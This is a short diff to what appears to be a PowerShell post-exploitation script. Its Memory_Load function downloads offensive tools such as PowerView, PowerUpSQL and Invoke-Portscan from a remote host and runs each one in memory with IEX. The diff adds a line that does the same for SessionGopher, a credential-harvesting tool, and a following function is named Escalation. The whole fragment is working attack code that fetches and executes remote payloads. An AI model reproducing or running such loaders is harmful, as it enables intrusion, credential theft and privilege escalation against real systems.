@@ -39,6 +39,7 @@ function Memory_Load {
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/Invoke-Portscan.txt")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerView.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SessionGopher.ps1")
 }
 
 function Escalation {
